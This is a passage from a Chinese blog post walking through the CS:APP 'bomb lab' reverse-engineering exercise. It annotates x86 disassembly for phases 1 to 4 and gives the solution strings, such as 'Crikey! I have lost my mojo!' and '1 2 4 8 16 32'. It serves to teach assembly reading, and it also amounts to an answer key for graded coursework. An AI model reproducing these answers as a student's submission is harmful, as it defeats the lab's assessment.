&lt;strings_not_equal+101&gt;;不相等，则跳转-&gt;return 1<br>   0x08049006 &lt;+50&gt;:movzbl (%ebx),%eax;s1首地址存入eax<br>   0x08049009 &lt;+53&gt;:mov    $0x0,%dl;edx=0<br>   0x0804900b &lt;+55&gt;:test   %al,%al<br>   0x0804900d &lt;+57&gt;:je     0x8049039 &lt;strings_not_equal+101&gt;;if(*s1==0)-&gt;return 0 <br>   ;(输入空字符)<br>   0x0804900f &lt;+59&gt;:mov    $0x1,%dl;edx=1<br>   0x08049011 &lt;+61&gt;:cmp    (%esi),%al<br>   0x08049013 &lt;+63&gt;:jne    0x8049039 &lt;strings_not_equal+101&gt;;if(*s1!=*s0)-&gt;return 1<br>   0x08049015 &lt;+65&gt;:mov    $0x0,%eax;eax=0（字符串从*s+1开始的偏移量）<br>   0x0804901a &lt;+70&gt;:jmp    0x8049024 &lt;strings_not_equal+80&gt;<br>   0x0804901c &lt;+72&gt;:add    $0x1,%eax<br>   0x0804901f &lt;+75&gt;:cmp    (%esi,%eax,1),%dl;if(*s0+(x++)+1!=*s1+x+1)<br>   0x08049022 &lt;+78&gt;:jne    0x8049034 &lt;strings_not_equal+96&gt;;return 1<br>   0x08049024 &lt;+80&gt;:movzbl 0x1(%ebx,%eax,1),%edx<br>   ;edx存入ebx+（eax存储的偏移量）+1，即*s1+x+1<br>   0x08049029 &lt;+85&gt;:test   %dl,%dl<br>   0x0804902b &lt;+87&gt;:jne    0x804901c &lt;strings_not_equal+72&gt; ;if(*s1+x+1!=0) 执行循环<br>   0x0804902d &lt;+89&gt;:mov    $0x0,%edx<br>   0x08049032 &lt;+94&gt;:jmp    0x8049039 &lt;strings_not_equal+101&gt;;否则完成比较，字符串相等，return 0<br>   0x08049034 &lt;+96&gt;:mov    $0x1,%edx<br>   0x08049039 &lt;+101&gt;:mov    %edx,%eax;if(edx==1) return 1;else return 0<br>   0x0804903b &lt;+103&gt;:mov    0x4(%esp),%ebx<br>   0x0804903f &lt;+107&gt;:mov    0x8(%esp),%esi<br>   0x08049043 &lt;+111&gt;:mov    0xc(%esp),%edi<br>   0x08049047 &lt;+115&gt;:add    $0x10,%esp<br>   0x0804904a &lt;+118&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p><code>&lt;string_length&gt;</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function string_length:<br>   0x08048fbb &lt;+0&gt;:mov    0x4(%esp),%edx;edx=[0x4+esp] --字符串首地址<br>   0x08048fbf &lt;+4&gt;:mov    $0x0,%eax;eax=0--计数<br>   0x08048fc4 &lt;+9&gt;:cmpb   $0x0,(%edx)<br>   0x08048fc7 &lt;+12&gt;:je     0x8048fd2 &lt;string_length+23&gt;;edx=0则退出<br>   0x08048fc9 &lt;+14&gt;:add    $0x1,%eax;eax++ --偏移量++<br>   0x08048fcc &lt;+17&gt;:cmpb   $0x0,(%edx,%eax,1);edx+eax!=0,即当前字符不为空<br>   0x08048fd0 &lt;+21&gt;:jne    0x8048fc9 &lt;string_length+14&gt;;则继续循环<br>   0x08048fd2 &lt;+23&gt;:repz ret ;返回eax则为字符串长度<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure></li></ul></li></ul></li><li><p>所以我们要使输入的字符串和<code>0x804a1a4</code>存储的字符串相等。</p></li><li><p>查看0x804a1a4存储的字符串：</p></li></ul><p><img src="/2021/04/01/bomblab/image-20210510225736415.png" alt="image-20210510225736415"></p><ul><li>运行<code>./bomb</code>，输入该字符串：<code>Crikey! I have lost my mojo!</code>，即可得到通过第一关：</li></ul><p><img src="/2021/04/01/bomblab/image-20210511204851504.png" alt="image-20210511204851504"></p><h4 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase_2"></a>2. phase_2</h4><ul><li>phase_2的汇编代码（调用函数<read_six_numbers>前的部分）    </read_six_numbers></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">Dump of assembler code for function phase_2:<br>   0x08048b74 &lt;+0&gt;:push   %esi;调用程序的地址入栈<br>   0x08048b75 &lt;+1&gt;:push   %ebx;被调用者保存寄存器的值入栈<br>   0x08048b76 &lt;+2&gt;:sub    $0x34,%esp;栈指针esp减去0x34，<br>   ;--给当前帧开辟大小为0x34的空间<br>   0x08048b79 &lt;+5&gt;:lea    0x18(%esp),%eax;eax=地址（0x18+esp） <br>   0x08048b7d &lt;+9&gt;:mov    %eax,0x4(%esp);M[0x4+esp]=eax=地址（0x18+esp）-数组首地址<br>   0x08048b81 &lt;+13&gt;:mov    0x40(%esp),%eax;eax=M[0x40+esp]<br>   0x08048b85 &lt;+17&gt;:mov    %eax,(%esp);M[esp]=eax=M[0x40+esp]-输入<br>   0x08048b88 &lt;+20&gt;:call   0x804921b &lt;read_six_numbers&gt;;调用函数（读入6个数）<br></code></pre></div></td></tr></table></figure><ul><li><p><code>&lt;read_six_numbers&gt;</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">#调用函数 esp=esp-4<br>Dump of assembler code for function read_six_numbers:<br>   0x0804921b &lt;+0&gt;:sub    $0x2c,%esp;栈指针esp减去0x2c<br>   0x0804921e &lt;+3&gt;:mov    0x34(%esp),%eax;eax=esp+0x34 [原esp+0x4]<br>   0x08049222 &lt;+7&gt;:lea    0x14(%eax),%edx<br>   0x08049225 &lt;+10&gt;:mov    %edx,0x1c(%esp);读入第六个数<br>   0x08049229 &lt;+14&gt;:lea    0x10(%eax),%edx<br>   0x0804922c &lt;+17&gt;:mov    %edx,0x18(%esp);读入第五个数<br>   0x08049230 &lt;+21&gt;:lea    0xc(%eax),%edx<br>   0x08049233 &lt;+24&gt;:mov    %edx,0x14(%esp);读入第四个数<br>   0x08049237 &lt;+28&gt;:lea    0x8(%eax),%edx<br>   0x0804923a &lt;+31&gt;:mov    %edx,0x10(%esp);读入第三个数<br>   0x0804923e &lt;+35&gt;:lea    0x4(%eax),%edx<br>   0x08049241 &lt;+38&gt;:mov    %edx,0xc(%esp);读入第二个数<br>   0x08049245 &lt;+42&gt;:mov    %eax,0x8(%esp);读入第一个数<br>   0x08049249 &lt;+46&gt;:movl   $0x804a3bf,0x4(%esp)<br>   0x08049251 &lt;+54&gt;:mov    0x30(%esp),%eax;eax=esp+0x30<br>   0x08049255 &lt;+58&gt;:mov    %eax,(%esp);M[esp]=eax=输入<br>   0x08049258 &lt;+61&gt;:call   0x8048870 &lt;__isoc99_sscanf@plt&gt;<br>   ;函数__isoc99_sscanf返回输入参数的个数<br>   0x0804925d &lt;+66&gt;:cmp    $0x5,%eax<br>   0x08049260 &lt;+69&gt;:jg     0x8049267 &lt;read_six_numbers+76&gt; ;输入参数数量大于5则安全退出该函数<br>   0x08049262 &lt;+71&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08049267 &lt;+76&gt;:add    $0x2c,%esp<br>   0x0804926a &lt;+79&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>函数<code>&lt;__isoc99_sscanf@plt&gt;</code>的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function __isoc99_sscanf@plt:<br>   0x08048870 &lt;+0&gt;:jmp    *0x804c040<br>   0x08048876 &lt;+6&gt;:push   $0x80<br>   0x0804887b &lt;+11&gt;:jmp    0x8048760<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><p>查看<code>__isoc99_sscanf</code>调用的第二个参数，可知可以成功输入6个参数的形式</p><p><img src="/2021/04/01/bomblab/image-20210511202402385.png" alt="image-20210511202402385"></p></li></ul></li><li><p>phase_2的汇编代码（调用函数<read_six_numbers>后的部分）</read_six_numbers></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">   0x08048b8d &lt;+25&gt;:cmpl   $0x1,0x18(%esp);比较M[0x18+esp]和0x1的大小<br>   0x08048b92 &lt;+30&gt;:je     0x8048b99 &lt;phase_2+37&gt;;若相等，跳转至&lt;phase_2+37&gt;<br>   0x08048b94 &lt;+32&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>   0x08048b99 &lt;+37&gt;:lea    0x1c(%esp),%ebx;ebx=地址（0x1c+esp）--第一次<br>   0x08048b9d &lt;+41&gt;:lea    0x30(%esp),%esi;esi=地址（0x30+esp）<br>   0x08048ba1 &lt;+45&gt;:mov    -0x4(%ebx),%eax;eax=M[ebx-0x4]<br>   ;--第一次为M[0x18+esp]=1<br>   0x08048ba4 &lt;+48&gt;:add    %eax,%eax;eax=2M[ebx-0x4]<br>   0x08048ba6 &lt;+50&gt;:cmp    %eax,(%ebx);比较M[ebx]和2M[ebx-0x4]的大小<br>   ;--第一次为M[0x1c+esp]和2M[0x18+esp]<br>   0x08048ba8 &lt;+52&gt;:je     0x8048baf &lt;phase_2+59&gt;;若相等，跳转至&lt;phase_2+59&gt;<br>   0x08048baa &lt;+54&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>   0x08048baf &lt;+59&gt;:add    $0x4,%ebx;ebx=ebx+0x4<br>   ;--第一次变为地址（0x20+esp）<br>   0x08048bb2 &lt;+62&gt;:cmp    %esi,%ebx;比较（0x30+esp）和ebx所存地址的大小<br>   0x08048bb4 &lt;+64&gt;:jne    0x8048ba1 &lt;phase_2+45&gt;;若不相等则跳转至&lt;phase_2+45&gt;,执行循环<br>   0x08048bb6 &lt;+66&gt;:add    $0x34,%esp;循环结束后，释放栈帧空间<br>   0x08048bb9 &lt;+69&gt;:pop    %ebx;还原ebx<br>   0x08048bba &lt;+70&gt;:pop    %esi;弹出入口地址<br>   0x08048bbb &lt;+71&gt;:ret;成功结束phase_2<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li>通过上方汇编代码的&lt;+62&gt;、&lt;+64&gt;可知，该函数会执行循环，在每次循环中ebx所存地址（初始地址为0x1c+esp）的值会先加0x4，直到等于0x30+esp。故循环的执行次数为5次。<code>0x1c+esp</code>的初始值为<code>M[0x18+esp]=1</code>的两倍为2，如此循环。可以推知我们输入6个数存储地址分别为上方的<code>(0x18+esp)</code>、<code>(0x1c+esp)</code>、<code>(0x20+esp)</code>、<code>(0x24+esp)</code>、<code>(0x28+esp)</code>、<code>(0x2c+esp)</code>，是以1为首项，2为公比的等比数列。故通关密码为：<code>1 2 4 8 16 32</code>，结果如下：</li></ul><p><img src="/2021/04/01/bomblab/image-20210511204913739.png" alt="image-20210511204913739"></p><h4 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase_3"></a>3. phase_3</h4><ul><li><p>phase_3的汇编代码（调用<code>&lt;__isoc99_sscanf@plt&gt;</code>前的部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function phase_3:<br>   0x08048bbc &lt;+0&gt;:sub    $0x2c,%esp;栈指针esp减去0x2c<br>   0x08048bbf &lt;+3&gt;:lea    0x1c(%esp),%eax;eax=(0x1c+esp)<br>   0x08048bc3 &lt;+7&gt;:mov    %eax,0xc(%esp);M[0xc+esp]=(0x1c+esp)<br>   0x08048bc7 &lt;+11&gt;:lea    0x18(%esp),%eax;eax=(0x18+esp)<br>   0x08048bcb &lt;+15&gt;:mov    %eax,0x8(%esp);M[0x8+esp]=(0x18+esp)<br>   0x08048bcf &lt;+19&gt;:movl   $0x804a3cb,0x4(%esp);M[0x4+esp]=0x804a3cb<br>   0x08048bd7 &lt;+27&gt;:mov    0x30(%esp),%eax;eax=M[0x30+esp]<br>   0x08048bdb &lt;+31&gt;:mov    %eax,(%esp);M[esp]=eax<br>   0x08048bde &lt;+34&gt;:call   0x8048870 &lt;__isoc99_sscanf@plt&gt;<br></code></pre></div></td></tr></table></figure><ul><li>这里也调用了函数<code>&lt;__isoc99_sscanf@plt&gt;</code>。查看其第二个参数所在地址<code>$0x804a3cb</code>的内容:</li></ul><p><img src="/2021/04/01/bomblab/image-20210511211431900.png" alt="image-20210511211431900"></p><ul><li>可知输入应该为两个整型数据，对应的保存地址分别为<code>0x18+esp</code>,<code>0x1c+esp</code>。</li></ul></li><li><p>phase_3的汇编代码（剩余部分）：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">   0x08048be3 &lt;+39&gt;:cmp    $0x1,%eax<br>   ;`&lt;__isoc99_sscanf@plt&gt;的返回值为输入参数的个数，保存在eax中<br>   0x08048be6 &lt;+42&gt;:jg     0x8048bed &lt;phase_3+49&gt;;参数个数需大于1，否则爆炸<br>   0x08048be8 &lt;+44&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048bed &lt;+49&gt;:cmpl   $0x7,0x18(%esp)<br>   0x08048bf2 &lt;+54&gt;:ja     0x8048c5a &lt;phase_3+158&gt;<br>   ;第一个整数需要无符号小于等于7，即范围为0-7否则跳转-&gt;爆炸<br>   0x08048bf4 &lt;+56&gt;:mov    0x18(%esp),%eax<br>   0x08048bf8 &lt;+60&gt;:jmp    *0x804a1e0(,%eax,4)<br>   ;无条件跳转至地址(M[0x804a1e0+4*eax]),即根据第一个整数为跳转的偏移量<br>   ;根据跳转表，以eax=1为例子如下：<br>   0x08048bff &lt;+67&gt;:mov    $0x0,%eax;eax=0<br>   0x08048c04 &lt;+72&gt;:jmp    0x8048c0b &lt;phase_3+79&gt;;跳转至&lt;phase_3+79&gt;<br>   0x08048c06 &lt;+74&gt;:mov    $0x240,%eax;(被跳过)<br>   0x08048c0b &lt;+79&gt;:sub    $0x28b,%eax;eax=eax-0x28b=-0x28b<br>   0x08048c10 &lt;+84&gt;:jmp    0x8048c17 &lt;phase_3+91&gt;;跳转至&lt;phase_3+91&gt;<br>   0x08048c12 &lt;+86&gt;:mov    $0x0,%eax;(被跳过)<br>   0x08048c17 &lt;+91&gt;:add    $0x35a,%eax;eax=eax+0x35a=0xcf<br>   0x08048c1c &lt;+96&gt;:jmp    0x8048c23 &lt;phase_3+103&gt;;跳转至&lt;phase_3+103&gt;<br>   0x08048c1e &lt;+98&gt;:mov    $0x0,%eax;(被跳过)<br>   0x08048c23 &lt;+103&gt;:sub    $0xc5,%eax;eax=eax-0xc5=0xa<br>   0x08048c28 &lt;+108&gt;:jmp    0x8048c2f &lt;phase_3+115&gt;;跳转至&lt;phase_3+115&gt;<br>   0x08048c2a &lt;+110&gt;:mov    $0x0,%eax;(被跳过)<br>   0x08048c2f &lt;+115&gt;:add    $0xc5,%eax;eax=eax+0xc5=0xcf<br>   0x08048c34 &lt;+120&gt;:jmp    0x8048c3b &lt;phase_3+127&gt;;跳转至&lt;phase_3+127&gt;<br>   0x08048c36 &lt;+122&gt;:mov    $0x0,%eax;(被跳过)<br>   0x08048c3b &lt;+127&gt;:sub    $0xc5,%eax;eax=eax-0xc5=0xa<br>   0x08048c40 &lt;+132&gt;:jmp    0x8048c47 &lt;phase_3+139&gt;;跳转至&lt;phase_3+139&gt;<br>   0x08048c42 &lt;+134&gt;:mov    $0x0,%eax;(被跳过)<br>   0x08048c47 &lt;+139&gt;:add    $0xc5,%eax;eax=eax+0xc5=0xcf<br>   0x08048c4c &lt;+144&gt;:jmp    0x8048c53 &lt;phase_3+151&gt;;跳转至&lt;phase_3+151&gt;<br>   0x08048c4e &lt;+146&gt;:mov    $0x0,%eax;(被跳过)<br>   0x08048c53 &lt;+151&gt;:sub    $0xc5,%eax;eax=eax-0xc5=0xa<br>   0x08048c58 &lt;+156&gt;:jmp    0x8048c64 &lt;phase_3+168&gt;;(需要此步)跳转至&lt;phase_3+168&gt;，否则爆炸<br>   0x08048c5a &lt;+158&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048c5f &lt;+163&gt;:mov    $0x0,%eax<br>   0x08048c64 &lt;+168&gt;:cmpl   $0x5,0x18(%esp)<br>   0x08048c69 &lt;+173&gt;:jg     0x8048c71 &lt;phase_3+181&gt;;M[0x18+esp]&gt;5则爆炸<br>   0x08048c6b &lt;+175&gt;:cmp    0x1c(%esp),%eax<br>   0x08048c6f &lt;+179&gt;:je     0x8048c76 &lt;phase_3+186&gt;;eax=M[0X1c+esp]时跳转过关，否则爆炸<br>   0x08048c71 &lt;+181&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048c76 &lt;+186&gt;:add    $0x2c,%esp<br>   0x08048c79 &lt;+189&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>从该汇编代码的<code>&lt;+156&gt;</code>到结束可知，我们需要经过跳转到达<code>0x08048c58 &lt;+156&gt;</code>,且输入的第一个数的值需要$&lt;=5$,输入的第二个数需要等于eax。 </p></li><li><p>我们通过x指令，参照<code>jmp    *0x804a1e0(,%eax,4)</code>的跳转表如下:</p><p><img src="/2021/04/01/bomblab/image-20210512084515692.png" alt="image-20210512084515692"></p></li><li><p>上述汇编代码的注释输入的第一个数<code>M[0x18+esp]=1</code>为例，先跳转至<code>&lt;phase_3+67&gt;</code>：</p><p>得到最终<code>M[0x1c+esp]</code>需要等于0xa，即十进制的10。故我们可以输入<code>1 10</code>过关：</p><p><img src="/2021/04/01/bomblab/image-20210512085729848.png" alt="image-20210512085729848"></p><ul><li><p>同样可推知输入0—7对应的第二个数组合如下：</p><p><code>0 586</code>     <code>1 10</code>     <code>2 661</code>    <code>3 -197</code>    <code>4 0</code>    <code>5 -197</code>    <code>6 0</code>    <code>7 197</code></p></li><li><p>同样输入0~5中的其他数以及经过运算得到的相对应的第二个数，也能过关。</p></li></ul></li></ul></li></ul><h4 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase_4"></a>4. phase_4</h4><ul><li><p>phase_4的汇编代码（调用<code>&lt;__isoc99_sscanf@plt&gt;</code>前的部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function phase_4:<br>   0x08048cd7 &lt;+0&gt;:sub    $0x2c,%esp;栈指针esp减去0x2c<br>   0x08048cda &lt;+3&gt;:lea    0x18(%esp),%eax;eax=(0x18+esp)<br>   0x08048cde &lt;+7&gt;:mov    %eax,0xc(%esp);M[0xc+esp]=eax=(0x18+esp)<br>   0x08048ce2 &lt;+11&gt;:lea    0x1c(%esp),%eax;eax=(0x1c+esp)<br>   0x08048ce6 &lt;+15&gt;:mov    %eax,0x8(%esp);M[0x8+esp]=eax=(0x1c+esp)<br>   0x08048cea &lt;+19&gt;:movl   $0x804a3cb,0x4(%esp);M[0x4+esp]=0x804a3cb<br>   0x08048cf2 &lt;+27&gt;:mov    0x30(%esp),%eax;eax=M[0x30+esp]<br>   0x08048cf6 &lt;+31&gt;:mov    %eax,(%esp);M[esp]=eax=M[0x30+esp]<br>   0x08048cf9 &lt;+34&gt;:call   0x8048870 &lt;__isoc99_sscanf@plt&gt;<br></code></pre></div></td></tr></table></figure><ul><li><p>和phase_3相似，调用函数<code>&lt;__isoc99_sscanf@plt&gt;</code>将输入以地址<code>0x804a3cb</code>存储的形式保存：</p><p><img src="/2021/04/01/bomblab/image-20210512133109861.png" alt="image-20210512133109861"></p><p>可见输入为两个整型数据，分别保存在地址<code>0x1c+esp</code>和<code>0x18+esp</code>中。（要注意<code>0x1c+esp</code>是第三个参数，<code>0x18+esp</code>是第四个参数，表示输入数据存储的次序，和phase_3正好相反！）。</p><p>函数返回值为输入数据的个数。</p></li></ul></li><li><p>phase_4的汇编代码（剩余部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">   0x08048cfe &lt;+39&gt;:cmp    $0x2,%eax;比较&lt;__isoc99_sscanf@plt&gt;的返回值和2<br>   0x08048d01 &lt;+42&gt;:jne    0x8048d11 &lt;phase_4+58&gt;;不相等则爆炸<br>   0x08048d03 &lt;+44&gt;:mov    0x18(%esp),%eax;eax=M[0x18+esp] 即输入的第二个整数<br>   0x08048d07 &lt;+48&gt;:cmp    $0x1,%eax;比较eax和1<br>   0x08048d0a &lt;+51&gt;:jle    0x8048d11 &lt;phase_4+58&gt;;eax&lt;=1则爆炸，故第二个整数要大于1<br>   0x08048d0c &lt;+53&gt;:cmp    $0x4,%eax;比较eax和4<br>   0x08048d0f &lt;+56&gt;:jle    0x8048d16 &lt;phase_4+63&gt;;eax&lt;=4则不会爆炸，故第二个整数小于等于4<br>   0x08048d11 &lt;+58&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048d16 &lt;+63&gt;:mov    0x18(%esp),%eax;eax=M[0x18+esp],还是第二个整数<br>   0x08048d1a &lt;+67&gt;:mov    %eax,0x4(%esp);M[0x4+esp]=eax=M[0x18+esp]<br>   0x08048d1e &lt;+71&gt;:movl   $0x9,(%esp);M[esp]=9<br>   0x08048d25 &lt;+78&gt;:call   0x8048c7a &lt;func4&gt;;调用函数&lt;func4&gt;<br>   0x08048d2a &lt;+83&gt;:cmp    0x1c(%esp),%eax<br>   ;比较&lt;func4&gt;的返回值和M[esp+0x1c](即输入的第一个整数)的大小<br>   0x08048d2e &lt;+87&gt;:je     0x8048d35 &lt;phase_4+94&gt;;相等则过关<br>   0x08048d30 &lt;+89&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048d35 &lt;+94&gt;:add    $0x2c,%esp<br>   0x08048d38 &lt;+97&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>故输入的第二个整数（大于1且小于等于4）会进入函数<code>&lt;func4&gt;</code>产生返回值，输入的第一个整数应该和该返回值相等</p></li><li><p>其中，<code>&lt;func4&gt;</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">;call调用函数，esp=esp-4。观察整个代码，有两个参数，设为x和y（初值为9和输入的第一个整数）<br>(gdb) disass func4<br>Dump of assembler code for function func4:<br>   0x08048c7a &lt;+0&gt;:sub    $0x1c,%esp;esp=esp-0x1c，开辟0x1c的栈帧空间<br>   0x08048c7d &lt;+3&gt;:mov    %ebx,0x10(%esp)<br>   0x08048c81 &lt;+7&gt;:mov    %esi,0x14(%esp)<br>   0x08048c85 &lt;+11&gt;:mov    %edi,0x18(%esp);以上三行保存被调用寄存器的原值<br>   0x08048c89 &lt;+15&gt;:mov    0x20(%esp),%esi;esi=M[0x20+esp]=x<br>   0x08048c8d &lt;+19&gt;:mov    0x24(%esp),%ebx;ebx=M[0x24+esp]=y<br>   0x08048c91 &lt;+23&gt;:test   %esi,%esi<br>   0x08048c93 &lt;+25&gt;:jle    0x8048cc0 &lt;func4+70&gt;;ZF=1或SF!=OF时跳转<br>   ;test %esi,%esi后，若esi=0，则ZF=1;或esi为负数，SF!=OF  -&gt;return 0<br>   0x08048c95 &lt;+27&gt;:cmp    $0x1,%esi<br>   0x08048c98 &lt;+30&gt;:je     0x8048cc5 &lt;func4+75&gt;;x=1时跳转至&lt;func4+75&gt; -&gt;return y<br>   0x08048c9a &lt;+32&gt;:mov    %ebx,0x4(%esp);M[0x4+esp]=ebx=y<br>   0x08048c9e &lt;+36&gt;:lea    -0x1(%esi),%eax;eax=(esi-1)=(x-1)<br>   0x08048ca1 &lt;+39&gt;:mov    %eax,(%esp);M[esp]=eax=(esi-1)=(x-1)<br>   0x08048ca4 &lt;+42&gt;:call   0x8048c7a &lt;func4&gt;;递归调用func4(x-1,y)<br>   0x08048ca9 &lt;+47&gt;:lea    (%eax,%ebx,1),%edi;edi=(eax+ebx)=func4(x-1,y)+y;<br>   0x08048cac &lt;+50&gt;:mov    %ebx,0x4(%esp);M[0x4+esp]=ebx=y<br>   0x08048cb0 &lt;+54&gt;:sub    $0x2,%esi;esi=(esi-2)=(x-2)<br>   0x08048cb3 &lt;+57&gt;:mov    %esi,(%esp);M[esp]=esi=(x-2)<br>   0x08048cb6 &lt;+60&gt;:call   0x8048c7a &lt;func4&gt;;递归调用func4(x-2,y)<br>   0x08048cbb &lt;+65&gt;:lea    (%edi,%eax,1),%ebx;ebx=(edi+eax)=func4(x-1,y)+y+func4(x-2,y)<br>   0x08048cbe &lt;+68&gt;:jmp    0x8048cc5 &lt;func4+75&gt;<br>   ;跳转至&lt;func4+75&gt; -&gt;return func4(x-1,y)+y+func4(x-2,y)<br>   0x08048cc0 &lt;+70&gt;:mov    $0x0,%ebx<br>   0x08048cc5 &lt;+75&gt;:mov    %ebx,%eax;eax=ebx,即为返回值<br>   0x08048cc7 &lt;+77&gt;:mov    0x10(%esp),%ebx<br>   0x08048ccb &lt;+81&gt;:mov    0x14(%esp),%esi<br>   0x08048ccf &lt;+85&gt;:mov    0x18(%esp),%edi;以上三行恢复被调用寄存器的值<br>   0x08048cd3 